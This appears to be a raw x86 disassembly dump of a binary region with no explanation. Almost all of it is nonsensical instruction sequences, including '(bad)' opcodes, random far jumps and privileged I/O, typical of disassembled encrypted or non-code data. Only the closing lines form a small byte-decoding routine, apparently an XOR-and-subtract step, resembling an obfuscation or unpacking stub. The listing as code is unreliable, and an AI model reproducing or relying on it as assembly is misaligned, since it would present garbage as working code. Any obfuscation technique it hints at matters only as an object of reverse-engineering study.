  4030c0:	adc    bl,BYTE PTR [edi-0x71]
  4030c3:	mov    eax,ds:0x62041ee1
  4030c8:	adc    ah,BYTE PTR [ebx-0x27]
  4030cb:	mov    ebx,?
  4030cd:	pushf  
  4030ce:	fs jmp 0xa5667a17
  4030d4:	push   edx
  4030d5:	sub    esi,DWORD PTR [ebp-0x6718b74b]
  4030db:	jae    0x4030d2
  4030dd:	mov    al,0x71
  4030df:	cmp    bh,0xaa
  4030e2:	fcmovnu st,st(6)
  4030e4:	mov    ecx,0xce33552c
  4030e9:	cs daa 
  4030eb:	dec    esp
  4030ec:	rol    BYTE PTR [ebp+0x2c17b928],1
  4030f2:	jae    0x40314a
  4030f4:	js     0x4030cd
  4030f6:	push   ecx
  4030f7:	dec    edx
  4030f8:	sub    bl,BYTE PTR [edi+0x2b]
  4030fb:	adc    al,0x2b
  4030fd:	push   ds
  4030fe:	xor    edi,DWORD PTR [esi]
  403100:	int    0x66
  403102:	gs sahf 
  403104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403105:	rol    DWORD PTR [edx+0x28ce0d7a],1
  40310b:	es es pop ss
  40310e:	xchg   ecx,eax
  40310f:	xchg   BYTE PTR [edi+0x5a],ch
  403112:	dec    edi
  403113:	iret   
  403114:	xchg   DWORD PTR [ecx+0x27],eax
  403117:	add    BYTE PTR [esi],0xce
  40311a:	push   es
  40311b:	dec    ebx
  40311c:	or     eax,0xa0ae4d41
  403121:	dec    ebp
  403122:	mov    DWORD PTR [edx-0x60e2d70a],ecx
  403128:	mov    cs,esp
  40312a:	xchg   ebx,eax
  40312b:	sar    DWORD PTR [eax],1
  40312d:	mov    DWORD PTR [eax],edi
  40312f:	push   ecx
  403130:	scas   eax,DWORD PTR es:[edi]
  403131:	inc    edx
  403132:	dec    esp
  403133:	je     0x40312f
  403135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403136:	mov    al,0xaa
  403138:	pop    ebx
  403139:	adc    al,bh
  40313b:	mov    WORD PTR [ebx+0x1e],gs
  40313e:	mov    dl,0x38
  403140:	in     al,0xf8
  403142:	data16 or BYTE PTR [edx-0x64ff6d1c],ch
  403149:	retf   
  40314a:	int3   
  40314b:	and    ebp,DWORD PTR [edx-0x2cd8be52]
  403151:	cmp    BYTE PTR [ebx+edx*2+0x6b],0xb7
  403156:	dec    ecx
  403157:	bound  ecx,QWORD PTR [edi]
  403159:	(bad)  
  40315a:	fild   WORD PTR [eax+0x568b536c]
  403160:	and    DWORD PTR [esi],ebx
  403162:	add    BYTE PTR [edx+eiz*8+0x3d94d9e4],0xf0
  40316a:	push   edx
  40316b:	mov    eax,0xb8eb45d3
  403170:	dec    edi
  403171:	enter  0xc1ab,0xe7
  403175:	xchg   DWORD PTR [edx],esp
  403177:	dec    eax
  403178:	(bad)  
  403179:	xchg   esi,eax
  40317a:	mov    eax,0xd69b18cc
  40317f:	out    0x56,al
  403181:	adc    ebx,DWORD PTR [edx+0x5e1c17f3]
  403187:	inc    ebx
  403188:	xor    al,0xf8
  40318a:	mov    BYTE PTR [eax-0x51],al
  40318d:	sbb    ebx,DWORD PTR ds:0xb967195e
  403193:	je     0x403163
  403195:	ja     0x403164
  403197:	dec    ebp
  403198:	or     edx,edi
  40319a:	lods   al,BYTE PTR ds:[esi]
  40319b:	xor    ah,BYTE PTR [ebp+0x73]
  40319e:	pusha  
  40319f:	inc    ebp
  4031a0:	stc    
  4031a1:	xor    ah,dh
  4031a3:	mov    cl,0xba
  4031a5:	mov    ebp,0x5200f971
  4031aa:	stos   BYTE PTR es:[edi],al
  4031ab:	retf   0xeb75
  4031ae:	test   BYTE PTR [eax-0x8],0x61
  4031b2:	push   0x47
  4031b4:	sbb    DWORD PTR [edi+ebx*8],edx
  4031b7:	push   es
  4031b8:	inc    ebx
  4031b9:	sbb    ebp,DWORD PTR [ebx+eax*4+0x29]
  4031bd:	mov    ebx,0xaab6c682
  4031c2:	(bad)  
  4031c3:	out    dx,eax
  4031c4:	mov    ds:0x585a7d51,eax
  4031c9:	nop
  4031ca:	mov    ah,0x57
  4031cc:	retf   
  4031cd:	and    DWORD PTR [edi],eax
  4031cf:	mov    al,0xe2
  4031d1:	jnp    0x403165
  4031d3:	inc    edi
  4031d4:	jmp    0xc4895616
  4031d9:	pop    ds
  4031da:	repnz push esi
  4031dc:	shl    DWORD PTR [esi],1
  4031de:	push   cs
  4031df:	mov    bh,BYTE PTR [esi+0x1]
  4031e2:	or     al,ch
  4031e4:	test   ch,dl
  4031e6:	fist   DWORD PTR [ebx]
  4031e8:	and    DWORD PTR [ebx+ebp*4],edi
  4031eb:	clc    
  4031ec:	jnp    0x403201
  4031ee:	xchg   BYTE PTR [esi-0x1cb0cde],bh
  4031f4:	sbb    edi,ebp
  4031f6:	sar    DWORD PTR [ebx+ebp*2],1
  4031f9:	add    esp,ebx
  4031fb:	or     BYTE PTR [ebx-0x49c55ac9],ch
  403201:	dec    edx
  403202:	jns    0x403199
  403204:	mov    ds:0x7661d32c,al
  403209:	int    0x31
  40320b:	dec    edi
  40320c:	dec    eax
  40320d:	mov    dl,0x4
  40320f:	sbb    al,0x7e
  403211:	pop    ds
  403212:	cmp    al,0x2c
  403214:	add    al,BYTE PTR [edi-0x1d]
  403217:	inc    ebx
  403218:	dec    ebp
  403219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40321a:	sti    
  40321b:	sbb    al,0x36
  40321d:	jmp    0xeb0c:0x2e428ffc
  403224:	mov    ch,0xe2
  403226:	in     eax,dx
  403227:	xchg   DWORD PTR [edx+edx*1-0x7c482320],ebp
  40322e:	idiv   BYTE PTR [eax+0x1a]
  403231:	cmc    
  403232:	jae    0x403297
  403234:	jg     0x403232
  403236:	push   edi
  403237:	push   ds
  403238:	fld    TBYTE PTR [eax+0x5b4a6993]
  40323e:	push   eax
  40323f:	sbb    al,0xd1
  403241:	(bad)  
  403242:	stc    
  403243:	cmp    ah,bl
  403245:	(bad)  
  403246:	test   DWORD PTR [ecx+0x5b],0x7c372cc2
  40324d:	cmp    edi,DWORD PTR [edi+ecx*8]
  403250:	lds    ebp,FWORD PTR [ebx+ecx*4]
  403253:	sub    bl,BYTE PTR [edi-0x6b5287b6]
  403259:	jmp    0x8ab:0xc62735d7
  403260:	call   DWORD PTR [ebp+eiz*8+0x45]
  403264:	jl     0x4031f5
  403266:	xor    esi,DWORD PTR [eax+0x43f9dcae]
  40326c:	(bad)  
  40326d:	push   0xf04bfb24
  403272:	or     DWORD PTR [ecx-0x2cdaed4c],0xffffff9f
  403279:	and    bl,BYTE PTR [ebp+ebx*4-0x33]
  40327d:	cmp    al,0x16
  40327f:	adc    ebx,esp
  403281:	test   BYTE PTR ss:[ebp-0x1e],ah
  403285:	inc    edi
  403286:	sar    DWORD PTR [ecx+0x4fce8cb7],1
  40328c:	sbb    BYTE PTR [ebp-0x7e],al
  40328f:	fst    QWORD PTR [ebp+0x43]
  403292:	push   ebx
  403293:	test   al,0x8a
  403295:	push   eax
  403296:	adc    esi,ecx
  403298:	(bad)  
  403299:	mov    cl,0xfa
  40329b:	popf   
  40329c:	out    0xc9,eax
  40329e:	inc    esp
  40329f:	jne    0x40327d
  4032a1:	lods   eax,DWORD PTR ds:[esi]
  4032a2:	xor    edx,ebx
  4032a4:	rol    BYTE PTR [edi-0x5098a25f],cl
  4032aa:	ja     0x403317
  4032ac:	jnp    0x403287
  4032ae:	sbb    al,0xc4
  4032b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032b1:	rcl    ah,cl
  4032b3:	mov    edi,0x6362f144
  4032b8:	das    
  4032b9:	jge    0x4032e0
  4032bb:	sti    
  4032bc:	push   edi
  4032bd:	test   bh,0x7e
  4032c0:	and    bh,al
  4032c2:	fxch   st(5)
  4032c4:	mov    dh,BYTE PTR [edi-0x3e74fbfa]
  4032ca:	les    ebx,FWORD PTR [ecx-0xe]
  4032cd:	sub    al,0x1a
  4032cf:	popf   
  4032d0:	rcr    BYTE PTR [edx+edx*2],0x90
  4032d4:	mov    bh,0x4f
  4032d6:	or     ecx,DWORD PTR [edi]
  4032d8:	idiv   BYTE PTR [edi+0x5]
  4032db:	cdq    
  4032dc:	ins    DWORD PTR es:[edi],dx
  4032dd:	pop    DWORD PTR [edi-0xccbfc54]
  4032e3:	int3   
  4032e4:	push   eax
  4032e5:	and    edx,DWORD PTR [ebp+0x10]
  4032e8:	mov    eax,0xd93840a0
  4032ed:	imul   esi,DWORD PTR [eax],0x5609e194
  4032f3:	inc    esp
  4032f4:	in     al,dx
  4032f5:	and    eax,0xeff393d9
  4032fa:	inc    ebx
  4032fb:	ficom  DWORD PTR [edi+0x79]
  4032fe:	(bad)  
  4032ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403300:	xor    eax,0x921e395c
  403305:	jge    0x4032e5
  403307:	mov    dl,0x43
  403309:	inc    ecx
  40330a:	div    DWORD PTR [ecx-0x44]
  40330d:	int    0x5c
  40330f:	in     eax,0x66
  403311:	mov    ebp,0x82781ecb
  403316:	add    BYTE PTR [edx-0x6837203],al
  40331c:	adc    al,0xca
  40331e:	aas    
  40331f:	jle    0x403320
  403321:	je     0x403328
  403323:	or     bl,ah
  403325:	out    0xe3,eax
  403327:	nop
  403328:	or     eax,0xe92961
  40332d:	mov    esp,0x5ce3c6f7
  403332:	cmp    al,0xc4
  403334:	inc    eax
  403335:	jbe    0x4033b5
  403337:	adc    eax,0xab71f745
  40333c:	enter  0x706e,0x75
  403340:	mov    ecx,0x27222d47
  403345:	mov    ebp,0x44f467da
  40334a:	and    eax,0x64ac7763
  40334f:	lea    eax,[edi]
  403351:	and    al,0x35
  403353:	sub    al,bl
  403355:	jno    0x403392
  403357:	jns    0x4032dd
  403359:	sar    DWORD PTR [edi+0x1936b90a],1
  40335f:	sbb    DWORD PTR [ebx+edx*2+0x53],edi
  403363:	sub    BYTE PTR [eax-0x2e],ch
  403366:	jbe    0x4033b3
  403368:	inc    esp
  403369:	adc    BYTE PTR [edi],0xb3
  40336c:	mov    edx,DWORD PTR [esi]
  40336e:	frstor [esi]
  403370:	and    cl,bh
  403372:	mov    al,BYTE PTR [esi+0x37]
  403375:	adc    cl,0xcd
  403378:	es xor eax,0x30b50178
  40337e:	arpl   WORD PTR [edx-0x29],bp
  403381:	and    al,0x2f
  403383:	dec    ecx
  403384:	sub    eax,0xc7740072
  403389:	push   esi
  40338a:	push   es
  40338b:	and    eax,eax
  40338d:	lock dec esp
  40338f:	add    edi,eax
  403391:	(bad)  
  403392:	mov    edi,0x2ac6a31b
  403397:	in     eax,0xb1
  403399:	inc    ebx
  40339a:	cld    
  40339b:	fnsave [edi+0x57eddf0c]
  4033a1:	outs   dx,BYTE PTR ds:[esi]
  4033a2:	ret    0x520
  4033a5:	or     BYTE PTR [edi-0x6],al
  4033a8:	arpl   WORD PTR [esi-0x56509075],bx
  4033ae:	pop    esp
  4033af:	or     BYTE PTR ds:0x3374b6f6,0x2e
  4033b6:	sub    dh,BYTE PTR [ebp+ecx*2-0x53]
  4033ba:	sbb    ebx,DWORD PTR [ebx-0x69]
  4033bd:	mov    ds:0x72b1b337,al
  4033c2:	mov    eax,ds:0xfaa76bd9
  4033c7:	jmp    0x40337d
  4033c9:	out    0x9f,eax
  4033cb:	jnp    0x4033e6
  4033cd:	mov    eax,ds:0x691dd357
  4033d2:	push   edx
  4033d3:	jle    0x403395
  4033d5:	cmp    ecx,esp
  4033d7:	cld    
  4033d8:	add    BYTE PTR ds:0xb9cccedf,dh
  4033de:	(bad)  
  4033df:	fs jle 0x403365
  4033e2:	mov    esi,0x468d4613
  4033e7:	retf   
  4033e8:	hlt    
  4033e9:	jg     0x403377
  4033eb:	jle    0x403384
  4033ed:	mov    eax,0x34d7913c
  4033f2:	pusha  
  4033f3:	mov    esp,0xf148eb44
  4033f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033fa:	push   esi
  4033fb:	lock pop ds
  4033fd:	jmp    0x7cd1:0x801b8b75
  403404:	shr    DWORD PTR [eax+0x18],0x35
  403408:	add    eax,0x4a171531
  40340d:	aaa    
  40340e:	pop    edi
  40340f:	sub    DWORD PTR [ecx-0x3036013c],esp
  403415:	inc    ebp
  403416:	ja     0x4033cb
  403418:	mov    BYTE PTR [eax],ah
  40341a:	dec    DWORD PTR [ebp+edx*1+0x53]
  40341e:	(bad)  
  40341f:	int3   
  403420:	mov    eax,0x891aff19
  403425:	jb     0x4033a9
  403427:	xchg   ebp,eax
  403428:	inc    edi
  403429:	add    edx,eax
  40342b:	rcr    BYTE PTR [ecx+edx*8-0x22],1
  40342f:	adc    BYTE PTR [eax+ebp*4-0x21],dh
  403433:	jg     0x40344b
  403435:	and    BYTE PTR [ecx],bl
  403437:	mov    ecx,0x8a75ddbf
  40343c:	arpl   WORD PTR [ecx+0x1e],dx
  40343f:	fistp  DWORD PTR [edi+0x4478ee3a]
  403445:	test   ebp,0xb072c7ee
  40344b:	mov    ds:0x220fe1d9,al
  403450:	add    eax,edx
  403452:	sub    bl,dh
  403454:	dec    ecx
  403455:	pop    eax
  403456:	push   ebx
  403457:	repz enter 0x5138,0xd1
  40345c:	pop    ecx
  40345d:	fldenv [ebp+0x7f9ce2b3]
  403463:	push   ds
  403464:	xchg   ebx,eax
  403465:	retf   0xa19a
  403468:	sub    DWORD PTR [esi+0x51],0xffffff96
  40346c:	jb     0x403464
  40346e:	mov    BYTE PTR [ebx+0x22],ah
  403471:	mov    dh,0xd6
  403473:	jae    0x403471
  403475:	call   0x2f33:0x55c467c7
  40347c:	dec    edx
  40347d:	js     0x40345e
  40347f:	push   edx
  403480:	lds    ecx,FWORD PTR [esi+edx*2-0x35]
  403484:	fisub  DWORD PTR [eax]
  403486:	cdq    
  403487:	scas   al,BYTE PTR es:[edi]
  403488:	out    dx,al
  403489:	xchg   esp,eax
  40348a:	add    DWORD PTR [edi-0x72],edi
  40348d:	(bad)  
  40348e:	pop    edx
  40348f:	dec    eax
  403490:	imul   esp,DWORD PTR [esi+0x44],0xffffffd4
  403494:	inc    eax
  403495:	ins    BYTE PTR es:[edi],dx
  403496:	addr16 (bad) 
  403498:	and    ch,bl
  40349a:	push   eax
  40349b:	mov    al,0x5e
  40349d:	mov    eax,0x864930ad
  4034a2:	and    al,0xb3
  4034a4:	mov    gs,WORD PTR [edi-0x6b]
  4034a7:	xchg   esi,eax
  4034a8:	rol    BYTE PTR [edx-0x70d08739],1
  4034ae:	lods   al,BYTE PTR ds:[esi]
  4034af:	cmp    ebx,eax
  4034b1:	push   esp
  4034b2:	fidiv  DWORD PTR [ecx+ebx*4+0x1e]
  4034b6:	or     ch,BYTE PTR [ebx-0x4d6492ce]
  4034bc:	inc    esp
  4034bd:	and    bl,BYTE PTR [ebx+0x3f]
  4034c0:	lds    edx,FWORD PTR [ecx]
  4034c2:	pop    eax
  4034c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034c4:	mul    DWORD PTR [eax+0x7751d832]
  4034ca:	mov    edx,0xd1b0f374
  4034cf:	pop    ecx
  4034d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034d1:	inc    eax
  4034d2:	mov    esp,ecx
  4034d4:	mov    WORD PTR [eax+0x29545b7f],?
  4034da:	mov    edx,esp
  4034dc:	lods   al,BYTE PTR ds:[esi]
  4034dd:	arpl   WORD PTR [edi],bp
  4034df:	cmp    eax,0x341bd31d
  4034e4:	pop    ecx
  4034e5:	jno    0x4034b0
  4034e7:	mov    bh,0xab
  4034e9:	mov    edi,0x58a91385
  4034ee:	push   ebp
  4034ef:	pop    ss
  4034f0:	push   edi
  4034f1:	or     edx,DWORD PTR [edi+0xc]
  4034f4:	ret    
  4034f5:	pop    ebx
  4034f6:	not    DWORD PTR [ecx-0x4220c316]
  4034fc:	mov    al,ds:0x37762eb3
  403501:	push   ss
  403502:	inc    eax
  403503:	stos   DWORD PTR es:[edi],eax
  403504:	gs je  0x4034ec
  403507:	rcr    DWORD PTR [ebp+0x25fb2e6],0x7d
  40350e:	dec    esp
  40350f:	xchg   ecx,eax
  403510:	out    dx,eax
  403511:	stos   BYTE PTR es:[edi],al
  403512:	aam    0x68
  403514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403515:	mov    al,es:0xa770e8aa
  40351b:	ja     0x40357b
  40351d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40351e:	nop
  40351f:	xchg   ebx,eax
  403520:	adc    BYTE PTR [edx+0x4ac94830],dh
  403526:	gs jo  0x403545
  403529:	xchg   edi,eax
  40352a:	pop    es
  40352b:	pop    esi
  40352c:	jecxz  0x40357b
  40352e:	add    al,0x1e
  403530:	daa    
  403531:	jmp    0x403549
  403533:	pextrw esp,(bad),0xc5
  403535:	mov    ds:0xcd57eebd,al
  40353a:	popf   
  40353b:	add    ecx,DWORD PTR [eax+edx*1-0x1c]
  40353f:	dec    eax
  403540:	cs out dx,eax
  403542:	popf   
  403543:	xor    al,BYTE PTR ds:0x272fe34b
  403549:	xchg   DWORD PTR [edx+0x57],esi
  40354c:	add    BYTE PTR [edx+0x6ae6b754],al
  403552:	in     eax,dx
  403553:	mov    esi,0x5d55f9ed
  403558:	(bad)  
  403559:	pop    ecx
  40355a:	dec    edx
  40355b:	mov    dl,0x59
  40355d:	mov    eax,ss
  40355f:	and    dl,BYTE PTR [edi-0xa]
  403562:	ret    0x74f0
  403565:	dec    esi
  403566:	pop    ebx
  403567:	loop   0x403537
  403569:	dec    ebx
  40356a:	or     esp,DWORD PTR [edx-0x4c1d757c]
  403570:	dec    esp
  403571:	daa    
  403572:	lea    ebp,[edx+0x58ef20ee]
  403578:	jns    0x4035e5
  40357a:	and    ebp,DWORD PTR [eax]
  40357c:	or     dh,dh
  40357e:	ret    0x1144
  403581:	mov    al,BYTE PTR [edi+edx*1]
  403584:	int3   
  403585:	mov    cl,0x2a
  403587:	or     BYTE PTR [ecx+0x44],bh
  40358a:	pop    ebp
  40358b:	cmp    BYTE PTR [eax+0x37],bh
  40358e:	leave  
  40358f:	push   esi
  403590:	sub    eax,DWORD PTR [eax+0x7494eee6]
  403596:	inc    edx
  403597:	cdq    
  403598:	mov    ds:0xdff1989c,al
  40359d:	mov    esi,0x1731171e
  4035a2:	ror    DWORD PTR [ecx+0x1a],1
  4035a5:	cmp    esi,DWORD PTR [ebx]
  4035a7:	and    al,0xdf
  4035a9:	in     al,0xe5
  4035ab:	and    DWORD PTR [edi+eiz*2],esi
  4035ae:	sbb    ah,BYTE PTR [ecx]
  4035b0:	call   FWORD PTR [ebx+0x33b0930e]
  4035b6:	cmp    ecx,DWORD PTR [ebx+edx*2+0x7c]
  4035ba:	add    BYTE PTR [esi+edx*2],dl
  4035bd:	ins    BYTE PTR es:[edi],dx
  4035be:	rcl    esp,0xaf
  4035c1:	sub    eax,0x9fda820d
  4035c6:	cmp    esp,edi
  4035c8:	cmp    bl,bl
  4035ca:	inc    esi
  4035cb:	into   
  4035cc:	cmp    eax,0xbff9e783
  4035d1:	outs   dx,DWORD PTR ds:[esi]
  4035d2:	hlt    
  4035d3:	inc    edi
  4035d4:	rcl    DWORD PTR [ecx-0x59],cl
  4035d7:	pop    eax
  4035d8:	rcr    DWORD PTR [ecx],1
  4035da:	ror    BYTE PTR [ecx-0x412f6864],1
  4035e0:	inc    esi
  4035e1:	js     0x40363f
  4035e3:	mov    ecx,0x504fa11f
  4035e8:	aaa    
  4035e9:	int    0x92
  4035eb:	iret   
  4035ec:	add    edi,DWORD PTR ds:0x24f8f448
  4035f2:	lock fucom st(3)
  4035f5:	in     al,0x3b
  4035f7:	cmp    cl,BYTE PTR [edi-0x2796997f]
  4035fd:	ins    BYTE PTR es:[edi],dx
  4035fe:	inc    eax
  4035ff:	stc    
  403600:	fcmovnb st,st(2)
  403602:	sub    DWORD PTR [ecx-0x60],0xd9409ad1
  403609:	sbb    al,0xad
  40360b:	pop    ecx
  40360c:	nop
  40360d:	jns    0x403603
  40360f:	das    
  403610:	retf   
  403611:	sub    al,0x40
  403613:	aas    
  403614:	in     eax,dx
  403615:	mov    ecx,0xd738a6d8
  40361a:	cmp    eax,0x7957954f
  40361f:	adc    edx,eax
  403621:	cmp    BYTE PTR [eax],0x5c
  403624:	out    dx,al
  403625:	jecxz  0x4035fa
  403627:	push   ebp
  403628:	(bad)  
  403629:	leave  
  40362a:	mov    dh,0xe0
  40362c:	fs xor esp,0x1350956d
  403633:	call   0xe5d3b9cc
  403638:	lods   al,BYTE PTR ds:[esi]
  403639:	rcr    DWORD PTR [ebp-0x40],0x24
  40363d:	pop    ss
  40363e:	out    dx,al
  40363f:	pushf  
  403640:	push   ecx
  403641:	push   cs
  403642:	pusha  
  403643:	xchg   ebx,eax
  403644:	add    ch,BYTE PTR [esi]
  403646:	(bad)  
  403647:	cld    
  403648:	fimul  WORD PTR [ebx+0x665d2a8a]
  40364e:	(bad)  
  40364f:	mov    DWORD PTR [esp+eiz*2],edx
  403652:	mov    bh,0x9a
  403654:	call   0xcc4b:0xa15d8843
  40365b:	pusha  
  40365c:	sbb    esp,DWORD PTR [ebx+0x66c20824]
  403662:	xchg   ebp,eax
  403663:	ret    
  403664:	xor    al,0x77
  403666:	bound  ebx,QWORD PTR [edi-0x7f]
  403669:	data16 jno 0x40365a
  40366c:	sbb    cl,BYTE PTR [esi-0x6d]
  40366f:	and    ebp,ebx
  403671:	out    dx,al
  403672:	(bad)  
  403673:	jge    0x40365a
  403675:	ret    0x3959
  403678:	shr    bl,1
  40367a:	arpl   WORD PTR [eax+0x7d],dx
  40367d:	cli    
  40367e:	dec    edi
  40367f:	mov    ebp,0xe916c1c4
  403684:	inc    ebx
  403685:	je     0x40366d
  403687:	jbe    0x403668
  403689:	mov    ebx,0xd43511ad
  40368e:	mov    dl,0x1
  403690:	(bad)  
  403691:	adc    DWORD PTR [ebx],eax
  403693:	sbb    BYTE PTR [esi-0x43],dh
  403696:	inc    ebx
  403697:	dec    edx
  403698:	push   eax
  403699:	add    BYTE PTR [ecx-0x5e],ch
  40369c:	int3   
  40369d:	shl    ebp,0xe2
  4036a0:	sub    bl,ah
  4036a2:	cli    
  4036a3:	jmp    0x40b7:0x91b1d5a7
  4036aa:	int    0xfe
  4036ac:	shr    DWORD PTR [eax+0x5c],0x98
  4036b0:	cwde   
  4036b1:	sub    edx,0xaf99bc65
  4036b7:	ins    BYTE PTR es:[edi],dx
  4036b8:	popa   
  4036b9:	push   eax
  4036ba:	xlat   BYTE PTR ds:[ebx]
  4036bb:	add    edi,eax
  4036bd:	arpl   di,cx
  4036bf:	sub    eax,ebx
  4036c1:	sahf   
  4036c2:	add    eax,0x2803c512
  4036c7:	adc    DWORD PTR [edi+0x2b],eax
  4036ca:	jecxz  0x4036bd
  4036cc:	dec    eax
  4036cd:	popf   
  4036ce:	gs push 0xffffffad
  4036d1:	lods   eax,DWORD PTR ds:[esi]
  4036d2:	popa   
  4036d3:	push   0xf6f26795
  4036d8:	sbb    al,0x83
  4036da:	mov    ebx,0x2f05ef3c
  4036df:	jmp    0x5dc5:0x2d7721c0
  4036e6:	(bad)  
  4036e7:	out    dx,eax
  4036e8:	(bad)  
  4036ea:	add    ebp,0x1d
  4036ed:	xchg   esi,eax
  4036ee:	mov    ecx,0x91ef8d4e
  4036f3:	rcr    DWORD PTR [edx],cl
  4036f5:	call   0x4e7d03e7
  4036fa:	into   
  4036fb:	lock jecxz 0x4036b4
  4036fe:	push   edi
  4036ff:	fnsave [esi]
  403701:	sti    
  403702:	loop   0x4036de
  403704:	sub    al,BYTE PTR [edi+0x21047ae6]
  40370a:	jb     0x4036b9
  40370c:	daa    
  40370d:	jb     0x4036c6
  40370f:	and    eax,0xeb103f6
  403714:	int    0xf2
  403716:	adc    eax,0xbe42ff57
  40371b:	nop
  40371c:	xchg   bx,ax
  40371e:	cmc    
  40371f:	mov    eax,ds:0x2d932ce7
  403724:	add    edi,edx
  403726:	pop    ds
  403727:	inc    ebp
  403728:	push   ebp
  403729:	data16 sub ch,BYTE PTR [ecx-0x573b012f]
  403730:	shl    al,cl
  403732:	cmp    bl,BYTE PTR [edi-0x68]
  403735:	mov    edi,0xc9a31b99
  40373a:	mov    bh,0x86
  40373c:	jmp    0xeb51:0x71ef9a90
  403743:	cmp    al,BYTE PTR [ecx]
  403745:	fcmovbe st,st(7)
  403747:	(bad)  
  403748:	pop    ebp
  403749:	adc    BYTE PTR [ecx],0x10
  40374c:	mov    cl,0x4f
  40374e:	sbb    al,0xb6
  403750:	sub    esi,esi
  403752:	outs   dx,DWORD PTR ds:[esi]
  403753:	imul   esi,DWORD PTR [edi*4-0x2517aa52],0xffffffe9
  40375b:	retf   0x988f
  40375e:	int    0x6
  403760:	imul   esp,DWORD PTR [ecx],0x1356e076
  403766:	ins    DWORD PTR es:[edi],dx
  403767:	pop    ecx
  403768:	dec    edi
  403769:	stos   BYTE PTR es:[edi],al
  40376a:	jmp    0xbd0e:0x72eb730d
  403771:	mov    ?,WORD PTR [edi-0xb]
  403774:	stos   DWORD PTR es:[edi],eax
  403775:	jle    0x40373d
  403777:	mov    BYTE PTR [ebx],ah
  403779:	inc    ebx
  40377a:	icebp  
  40377b:	dec    ebp
  40377c:	call   0x461b:0x6efc275e
  403783:	mov    cl,0xfd
  403785:	in     eax,dx
  403786:	inc    ebp
  403787:	inc    ecx
  403788:	shl    DWORD PTR [ecx-0x6c],1
  40378b:	dec    edx
  40378c:	test   cl,ch
  40378e:	aaa    
  40378f:	sar    DWORD PTR [eax-0xc],1
  403792:	jbe    0x4037b1
  403794:	sub    BYTE PTR [ecx],bl
  403796:	xchg   esp,eax
  403797:	jo     0x40376a
  403799:	dec    ebp
  40379a:	shl    BYTE PTR [eax],cl
  40379c:	jne    0x40374f
  40379e:	jecxz  0x403749
  4037a0:	jne    0x4037e9
  4037a2:	je     0x4037d4
  4037a4:	jne    0x403782
  4037a6:	data16 jge 0x4037fd
  4037a9:	fucomp st(7)
  4037ab:	in     eax,dx
  4037ac:	sub    DWORD PTR [esi],edx
  4037ae:	xor    BYTE PTR [ebp-0x6e],0xb
  4037b2:	push   0x6b
  4037b4:	xlat   BYTE PTR ds:[ebx]
  4037b5:	inc    ecx
  4037b6:	cmp    al,0xe7
  4037b8:	iret   
  4037b9:	dec    ebp
  4037ba:	xchg   ebx,eax
  4037bb:	(bad)  
  4037bc:	(bad)  
  4037bd:	mov    WORD PTR [bx+di+0x5],?
  4037c1:	sub    al,0xac
  4037c3:	xchg   edi,eax
  4037c4:	adc    BYTE PTR [ecx],dh
  4037c6:	imul   esp,DWORD PTR [esp+ecx*1+0x76f480df],0x66
  4037ce:	enter  0x3e44,0x2e
  4037d2:	pop    esp
  4037d3:	inc    ecx
  4037d4:	push   cs
  4037d5:	int    0x38
  4037d7:	in     eax,dx
  4037d8:	pop    ecx
  4037d9:	das    
  4037da:	jl     0x403788
  4037dc:	xchg   esi,eax
  4037dd:	ja     0x403777
  4037df:	ja     0x40381a
  4037e1:	das    
  4037e2:	and    eax,DWORD PTR [ecx+0x70]
  4037e5:	test   BYTE PTR [ebp+0x18bad67],bl
  4037eb:	push   edi
  4037ec:	push   esi
  4037ed:	and    BYTE PTR [edi],0x42
  4037f0:	je     0x403799
  4037f2:	sub    BYTE PTR [eax],cl
  4037f4:	jecxz  0x403847
  4037f6:	mov    ebx,DWORD PTR [eax-0x42]
  4037f9:	cmp    al,0xb7
  4037fb:	shr    DWORD PTR [esi],1
  4037fd:	mov    bh,0x33
  4037ff:	sub    eax,esi
  403801:	adc    esp,esp
  403803:	adc    dh,dl
  403805:	call   esp
  403807:	fucomp st(1)
  403809:	or     DWORD PTR [eax+0x26],esp
  40380c:	jno    0x4037d8
  40380e:	scas   al,BYTE PTR es:[edi]
  40380f:	jp     0x4037c5
  403811:	repz out 0x63,al
  403814:	or     bh,dl
  403816:	fcomp  QWORD PTR [edi+eax*1]
  403819:	mov    ch,0xe2
  40381b:	out    dx,eax
  40381c:	scas   al,BYTE PTR es:[edi]
  40381d:	jmp    0x40389c
  40381f:	outs   dx,BYTE PTR ds:[esi]
  403820:	xor    eax,0xeff1fe77
  403825:	jne    0x4037a8
  403827:	xchg   edx,eax
  403828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403829:	inc    edi
  40382a:	xchg   edi,eax
  40382b:	push   ebp
  40382c:	inc    edi
  40382d:	sub    dl,BYTE PTR [edi-0x11]
  403830:	shl    BYTE PTR [ebp+0x74],1
  403833:	stc    
  403834:	(bad)  
  403836:	mov    al,0x69
  403838:	call   0x875b:0x18e4689a
  40383f:	(bad)  
  403840:	jmp    0xa0cc:0x45cb89e3
  403847:	div    BYTE PTR [ebp-0x223ae100]
  40384d:	and    esp,ecx
  40384f:	add    BYTE PTR [eax],al
  403851:	xor    bl,bh
  403853:	mov    DWORD PTR [ecx],0x458bf445
  403859:	hlt    
  40385a:	mov    ecx,DWORD PTR [ebp-0x8]
  40385d:	mov    ecx,DWORD PTR [ecx]
  40385f:	mov    ecx,DWORD PTR [ecx]
  403861:	mov    ecx,DWORD PTR [ecx]
  403863:	mov    DWORD PTR [ecx+0x1],eax
  403866:	mov    al,BYTE PTR [ebp-0x1]
  403869:	mov    ecx,DWORD PTR [ebp-0x8]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    ecx,DWORD PTR [ecx]
  403872:	push   DWORD PTR [ebp-0x2c]
  403875:	xor    al,0x6f
  403877:	sub    al,0xd
  403879:	mov    BYTE PTR [ecx],al
